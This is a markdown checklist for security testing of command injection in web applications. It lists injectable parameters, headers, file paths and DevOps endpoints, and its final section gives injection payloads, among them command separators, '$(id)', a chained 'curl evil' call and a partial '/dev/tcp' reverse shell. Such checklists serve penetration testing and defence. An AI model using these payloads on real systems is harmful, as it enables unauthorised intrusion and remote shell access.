
## URL/Query-Based Entry Points
- [ ] `/ping?ip=127.0.0.1`
- [ ] `/lookup?domain=example.com`
- [ ] `/dns?host=abc.com`
- [ ] `/traceroute?target=host.com`
- [ ] `/whois?domain=target.com`
- [ ] `/convert?img=logo.png`
- [ ] `/pdfgen?url=https://example.com`
- [ ] `/compress?file=report.txt`
- [ ] `/install?package=nginx`
- [ ] `/backup?target=db_name`

---

## Form Parameters & JSON Body
- [ ] `{ "host": "127.0.0.1" }`
- [ ] `{ "command": "ls -la" }`
- [ ] `{ "target": "domain.com" }`
- [ ] `{ "ip": "8.8.8.8" }`
- [ ] File upload path fields (`upload_dir`, `output_path`)
- [ ] Log file location field
- [ ] Image conversion output format
- [ ] Compression tool selector (`gzip`, `zip`)
- [ ] File renaming or cloning field
- [ ] Admin tool with `script_name` input

---

## Headers & Metadata-Based Injection Points
- [ ] `User-Agent` passed to OS command (`curl`, `wget`, etc.)
- [ ] `X-Forwarded-For` logged to shell script
- [ ] `Host` header used in scripts
- [ ] `Referer` passed to shell log
- [ ] `X-Real-IP` used in internal scripts
- [ ] Custom header like `X-Device-Name`
- [ ] `Authorization` header for logging
- [ ] `Content-Type` or `Accept` header if parsed
- [ ] `Cookie` values inserted into shell logs
- [ ] File path in headers (`X-Path`, etc.)

---

## File Operations and Paths
- [ ] File name parameters (`filename=test.txt`)
- [ ] Directory path parameters (`path=/tmp/`)
- [ ] Log viewer file input (`log=access.log`)
- [ ] Temp file handler (`temp=tmp123`)
- [ ] Report export input (`export=report.csv`)
- [ ] Download/export command path
- [ ] Cleanup job targets (`target=old.log`)
- [ ] ZIP file paths (`zip=dir/to/zip`)
- [ ] Restore points or rollback paths
- [ ] Bash script targets (`script=runme.sh`)

---

## Developer/DevOps Tools in APIs 
- [ ] `git` operations (`repo=https://...`)
- [ ] `docker` or `kubectl` input params
- [ ] Build scripts (`script`, `task`)
- [ ] Jenkins/CICD job inputs (`task=clean`)
- [ ] Command execution endpoints (`cmd=ls`)
- [ ] Shell command input in debug panel
- [ ] Runtime exec inputs (`command=...`)
- [ ] Crontab manager input fields
- [ ] Script upload and executor
- [ ] Any param passed to `system()`, `exec()`, `popen()`, `shell_exec()`

---

## Bonus Injection Payload Testing
- [ ] `; whoami`
- [ ] `&& ls -la`
- [ ] `| id`
- [ ] `$(id)`
- [ ] \`uname -a\`
- [ ] `%0a` or `%0d` injection
- [ ] `#` to comment out
- [ ] Chained payloads (e.g., `127.0.0.1; curl evil`)
- [ ] Time-based delay (e.g., `; sleep 5`)
- [ ] Reverse shell tests (`bash -i >& /dev/tcp/...`)

---
